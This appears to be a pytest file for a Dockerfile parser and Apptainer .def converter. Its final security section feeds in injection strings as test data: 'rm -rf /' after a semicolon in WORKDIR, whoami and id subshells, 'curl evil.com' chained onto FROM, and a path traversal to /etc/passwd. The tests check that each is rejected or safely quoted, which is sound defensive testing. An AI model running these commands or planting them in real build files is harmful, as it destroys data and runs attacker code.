"""Tests for the Dockerfile parser and Apptainer .def converter."""

from __future__ import annotations

import pytest

from src.agent.dockerfile import (
    DockerfileParsed,
    PREBUILT_ALIASES,
    def_content_hash,
    dockerfile_to_def,
    parse_dockerfile,
)


# ---------------------------------------------------------------------------
# Parser tests
# ---------------------------------------------------------------------------


class TestParseBasic:
    def test_simple_from_entrypoint(self):
        parsed = parse_dockerfile('FROM base\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.from_image == "base"
        assert parsed.entrypoint_cmd == ["bash", "job.sh"]
        assert not parsed.needs_build

    def test_from_with_tag(self):
        parsed = parse_dockerfile('FROM python:3.12-slim\nENTRYPOINT ["python", "main.py"]')
        assert parsed.from_image == "python:3.12-slim"
        assert parsed.needs_build  # Not a prebuilt alias

    def test_from_with_digest(self):
        digest = "a" * 64
        parsed = parse_dockerfile(f'FROM python@sha256:{digest}\nCMD ["python", "app.py"]')
        assert parsed.from_image == f"python@sha256:{digest}"
        assert parsed.needs_build


class TestParseRun:
    def test_run_single(self):
        parsed = parse_dockerfile('FROM python312\nRUN pip install pandas\nENTRYPOINT ["python", "main.py"]')
        assert parsed.run_commands == ["pip install pandas"]
        assert parsed.needs_build  # Has RUN commands

    def test_run_multiple(self):
        parsed = parse_dockerfile(
            'FROM python312\nRUN pip install pandas\nRUN pip install numpy\nENTRYPOINT ["python", "main.py"]'
        )
        assert parsed.run_commands == ["pip install pandas", "pip install numpy"]

    def test_run_backslash_continuation(self):
        dockerfile = 'FROM python312\nRUN pip install \\\n    pandas \\\n    numpy\nENTRYPOINT ["python", "main.py"]'
        parsed = parse_dockerfile(dockerfile)
        assert len(parsed.run_commands) == 1
        assert "pandas" in parsed.run_commands[0]
        assert "numpy" in parsed.run_commands[0]


class TestParseEnv:
    def test_env_equals(self):
        parsed = parse_dockerfile('FROM base\nENV FOO=bar\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.env_vars == {"FOO": "bar"}
        assert parsed.needs_build  # Has ENV

    def test_env_space(self):
        parsed = parse_dockerfile('FROM base\nENV FOO bar\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.env_vars == {"FOO": "bar"}

    def test_env_multiple_equals(self):
        parsed = parse_dockerfile('FROM base\nENV FOO=bar BAZ=qux\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.env_vars == {"FOO": "bar", "BAZ": "qux"}

    def test_env_quoted_value(self):
        parsed = parse_dockerfile('FROM base\nENV FOO="hello world"\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.env_vars == {"FOO": "hello world"}


class TestParseWorkdir:
    def test_workdir(self):
        parsed = parse_dockerfile('FROM base\nWORKDIR /app\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.workdir == "/app"
        assert parsed.needs_build  # Has WORKDIR


class TestParseEntrypoint:
    def test_exec_form(self):
        parsed = parse_dockerfile('FROM base\nENTRYPOINT ["python", "main.py"]')
        assert parsed.entrypoint_cmd == ["python", "main.py"]

    def test_shell_form(self):
        parsed = parse_dockerfile("FROM base\nENTRYPOINT python main.py")
        assert parsed.entrypoint_cmd == ["bash", "-c", "python main.py"]

    def test_cmd_as_entrypoint(self):
        parsed = parse_dockerfile('FROM base\nCMD ["python", "main.py"]')
        assert parsed.entrypoint_cmd == ["python", "main.py"]

    def test_entrypoint_over_cmd(self):
        """When both ENTRYPOINT and CMD are set, ENTRYPOINT wins."""
        parsed = parse_dockerfile(
            'FROM base\nCMD ["default.sh"]\nENTRYPOINT ["python", "main.py"]'
        )
        assert parsed.entrypoint_cmd == ["python", "main.py"]

    def test_no_entrypoint_no_cmd(self):
        with pytest.raises(ValueError, match="ENTRYPOINT or CMD"):
            parse_dockerfile("FROM base")

    def test_no_from(self):
        with pytest.raises(ValueError, match="FROM"):
            parse_dockerfile('ENTRYPOINT ["bash", "job.sh"]')


class TestParseEdgeCases:
    def test_comments_and_empty_lines(self):
        dockerfile = """
# This is a comment
FROM base

# Another comment
ENTRYPOINT ["bash", "job.sh"]
"""
        parsed = parse_dockerfile(dockerfile)
        assert parsed.from_image == "base"
        assert parsed.entrypoint_cmd == ["bash", "job.sh"]

    def test_ignored_instructions(self):
        dockerfile = """FROM base
COPY . /app
ADD data.tar.gz /data
EXPOSE 8080
VOLUME /data
USER nobody
ARG VERSION=1.0
LABEL maintainer="test"
ENTRYPOINT ["bash", "job.sh"]
"""
        parsed = parse_dockerfile(dockerfile)
        assert parsed.from_image == "base"
        assert parsed.entrypoint_cmd == ["bash", "job.sh"]
        assert len(parsed.run_commands) == 0

    def test_multistage_last_from(self):
        dockerfile = """FROM golang:1.21 AS builder
RUN go build -o app .
FROM base
ENTRYPOINT ["bash", "job.sh"]
"""
        parsed = parse_dockerfile(dockerfile)
        assert parsed.from_image == "base"
        # V6: Multi-stage state reset — builder-stage RUN commands are cleared
        assert parsed.run_commands == []


# ---------------------------------------------------------------------------
# needs_build tests
# ---------------------------------------------------------------------------


class TestNeedsBuild:
    def test_prebuilt_no_run_no_build(self):
        parsed = parse_dockerfile('FROM base\nENTRYPOINT ["bash", "job.sh"]')
        assert not parsed.needs_build

    def test_prebuilt_with_run_needs_build(self):
        parsed = parse_dockerfile('FROM python312\nRUN pip install pandas\nENTRYPOINT ["python", "main.py"]')
        assert parsed.needs_build

    def test_real_image_needs_build(self):
        parsed = parse_dockerfile('FROM python:3.12-slim\nENTRYPOINT ["python", "main.py"]')
        assert parsed.needs_build

    def test_prebuilt_with_env_needs_build(self):
        parsed = parse_dockerfile('FROM base\nENV FOO=bar\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.needs_build

    def test_prebuilt_with_workdir_needs_build(self):
        parsed = parse_dockerfile('FROM base\nWORKDIR /app\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.needs_build

    def test_all_prebuilt_aliases(self):
        """All prebuilt aliases should not need build when used alone."""
        for alias in PREBUILT_ALIASES:
            parsed = parse_dockerfile(f'FROM {alias}\nENTRYPOINT ["bash", "job.sh"]')
            assert not parsed.needs_build, f"Alias '{alias}' should not need build"


# ---------------------------------------------------------------------------
# .def conversion tests
# ---------------------------------------------------------------------------


class TestDefConversion:
    def test_localimage_bootstrap(self):
        parsed = parse_dockerfile('FROM python312\nRUN pip install pandas\nENTRYPOINT ["python", "main.py"]')
        def_content = dockerfile_to_def(parsed)
        assert "Bootstrap: localimage" in def_content
        assert "python312.sif" in def_content

    def test_docker_bootstrap(self):
        parsed = parse_dockerfile('FROM python:3.12-slim\nENTRYPOINT ["python", "main.py"]')
        def_content = dockerfile_to_def(parsed)
        assert "Bootstrap: docker" in def_content
        assert "From: python:3.12-slim" in def_content

    def test_post_section(self):
        parsed = parse_dockerfile('FROM python312\nRUN pip install pandas\nENTRYPOINT ["python", "main.py"]')
        def_content = dockerfile_to_def(parsed)
        assert "%post" in def_content
        assert "pip install pandas" in def_content

    def test_environment_section(self):
        parsed = parse_dockerfile('FROM base\nENV FOO=bar\nENTRYPOINT ["bash", "job.sh"]')
        def_content = dockerfile_to_def(parsed)
        assert "%environment" in def_content
        # shlex.quote doesn't add quotes for simple safe strings
        assert "export FOO=bar" in def_content

    def test_workdir_in_post_and_env(self):
        parsed = parse_dockerfile('FROM base\nWORKDIR /app\nENTRYPOINT ["bash", "job.sh"]')
        def_content = dockerfile_to_def(parsed)
        assert "mkdir -p /app" in def_content
        assert "APPTAINER_CWD=/app" in def_content

    def test_no_post_or_env_for_simple(self):
        """A simple prebuilt-only Dockerfile (needs_build=False) still produces valid .def."""
        parsed = DockerfileParsed(
            from_image="base",
            entrypoint_cmd=["bash", "job.sh"],
            needs_build=False,
        )
        def_content = dockerfile_to_def(parsed)
        assert "Bootstrap: localimage" in def_content
        assert "%post" not in def_content
        assert "%environment" not in def_content

    def test_hash_deterministic(self):
        parsed = parse_dockerfile('FROM python312\nRUN pip install pandas\nENTRYPOINT ["python", "main.py"]')
        def1 = dockerfile_to_def(parsed)
        def2 = dockerfile_to_def(parsed)
        assert def_content_hash(def1) == def_content_hash(def2)

    def test_different_content_different_hash(self):
        p1 = parse_dockerfile('FROM python312\nRUN pip install pandas\nENTRYPOINT ["python", "main.py"]')
        p2 = parse_dockerfile('FROM python312\nRUN pip install numpy\nENTRYPOINT ["python", "main.py"]')
        assert def_content_hash(dockerfile_to_def(p1)) != def_content_hash(dockerfile_to_def(p2))


# ---------------------------------------------------------------------------
# Multi-stage reset tests (V6)
# ---------------------------------------------------------------------------


class TestMultiStageReset:
    def test_builder_run_not_in_final_def(self):
        """Builder-stage RUN commands should NOT appear in .def output."""
        dockerfile = """FROM golang:1.21 AS builder
RUN go build -o /app/main .
RUN echo "builder only"
FROM python312
RUN pip install requests
ENTRYPOINT ["python", "main.py"]
"""
        parsed = parse_dockerfile(dockerfile)
        def_content = dockerfile_to_def(parsed)
        assert "go build" not in def_content
        assert "builder only" not in def_content
        assert "pip install requests" in def_content

    def test_builder_env_not_in_final_def(self):
        """Builder-stage ENV vars should NOT appear in .def output."""
        dockerfile = """FROM golang:1.21 AS builder
ENV GOPATH=/go
FROM python312
ENV PYTHONPATH=/app
ENTRYPOINT ["python", "main.py"]
"""
        parsed = parse_dockerfile(dockerfile)
        def_content = dockerfile_to_def(parsed)
        assert "GOPATH" not in def_content
        assert "PYTHONPATH" in def_content

    def test_builder_workdir_not_in_final(self):
        """Builder-stage WORKDIR should NOT carry to final stage."""
        dockerfile = """FROM golang:1.21 AS builder
WORKDIR /build
FROM python312
WORKDIR /app
ENTRYPOINT ["python", "main.py"]
"""
        parsed = parse_dockerfile(dockerfile)
        assert parsed.workdir == "/app"

    def test_last_from_wins(self):
        """Only the last FROM's RUN/ENV/WORKDIR should be used."""
        dockerfile = """FROM node:20 AS frontend
RUN npm build
ENV NODE_ENV=production
WORKDIR /frontend

FROM golang:1.21 AS backend
RUN go build
ENV GOPATH=/go
WORKDIR /backend

FROM base
RUN echo final
ENV STAGE=final
WORKDIR /app
ENTRYPOINT ["bash", "job.sh"]
"""
        parsed = parse_dockerfile(dockerfile)
        assert parsed.from_image == "base"
        assert parsed.run_commands == ["echo final"]
        assert parsed.env_vars == {"STAGE": "final"}
        assert parsed.workdir == "/app"


# ---------------------------------------------------------------------------
# Security validation tests
# ---------------------------------------------------------------------------


class TestSecurityValidation:
    # -- ENV injection --
    def test_env_value_injection_quoted(self):
        """Shell expansion in ENV values should be safely quoted in .def."""
        parsed = parse_dockerfile('FROM base\nENV FOO=$(whoami)\nENTRYPOINT ["bash", "job.sh"]')
        def_content = dockerfile_to_def(parsed)
        assert "export FOO='$(whoami)'" in def_content

    def test_env_value_backtick_quoted(self):
        parsed = parse_dockerfile('FROM base\nENV FOO=`id`\nENTRYPOINT ["bash", "job.sh"]')
        def_content = dockerfile_to_def(parsed)
        # shlex.quote wraps in single quotes
        assert "'`id`'" in def_content

    def test_env_key_semicolon_rejected(self):
        """Space form: ENV KEY VALUE — semicolon in key is rejected."""
        with pytest.raises(ValueError, match="Invalid ENV key"):
            parse_dockerfile('FROM base\nENV FOO;BAR value\nENTRYPOINT ["bash", "job.sh"]')

    def test_env_key_starts_with_digit_rejected(self):
        with pytest.raises(ValueError, match="Invalid ENV key"):
            parse_dockerfile('FROM base\nENV 1FOO=val\nENTRYPOINT ["bash", "job.sh"]')

    def test_env_key_valid(self):
        parsed = parse_dockerfile('FROM base\nENV _MY_VAR_2=val\nENTRYPOINT ["bash", "job.sh"]')
        assert "_MY_VAR_2" in parsed.env_vars

    # -- WORKDIR injection --
    def test_workdir_injection_semicolon_rejected(self):
        with pytest.raises(ValueError, match="Invalid WORKDIR"):
            parse_dockerfile('FROM base\nWORKDIR /app; rm -rf /\nENTRYPOINT ["bash", "job.sh"]')

    def test_workdir_injection_subshell_rejected(self):
        with pytest.raises(ValueError, match="Invalid WORKDIR"):
            parse_dockerfile('FROM base\nWORKDIR /app$(whoami)\nENTRYPOINT ["bash", "job.sh"]')

    def test_workdir_relative_rejected(self):
        with pytest.raises(ValueError, match="Invalid WORKDIR"):
            parse_dockerfile('FROM base\nWORKDIR app\nENTRYPOINT ["bash", "job.sh"]')

    def test_workdir_valid_nested(self):
        parsed = parse_dockerfile('FROM base\nWORKDIR /app/src/main\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.workdir == "/app/src/main"

    # -- FROM image validation --
    def test_from_path_traversal_rejected(self):
        with pytest.raises(ValueError, match="Invalid FROM image"):
            parse_dockerfile('FROM ../../../../etc/passwd\nENTRYPOINT ["bash", "job.sh"]')

    def test_from_injection_rejected(self):
        with pytest.raises(ValueError, match="Invalid FROM image"):
            parse_dockerfile('FROM python;curl evil.com\nENTRYPOINT ["bash", "job.sh"]')

    def test_from_valid_registry(self):
        parsed = parse_dockerfile('FROM nvidia/cuda:12.0-runtime\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.from_image == "nvidia/cuda:12.0-runtime"

    def test_from_valid_ghcr(self):
        parsed = parse_dockerfile('FROM ghcr.io/owner/repo:v1.0\nENTRYPOINT ["bash", "job.sh"]')
        assert parsed.from_image == "ghcr.io/owner/repo:v1.0"

    def test_from_prebuilt_alias_bypasses_regex(self):
        """Prebuilt aliases like 'base' and 'r-base' should pass even if regex wouldn't match."""
        for alias in PREBUILT_ALIASES:
            parsed = parse_dockerfile(f'FROM {alias}\nENTRYPOINT ["bash", "job.sh"]')
            assert parsed.from_image == alias
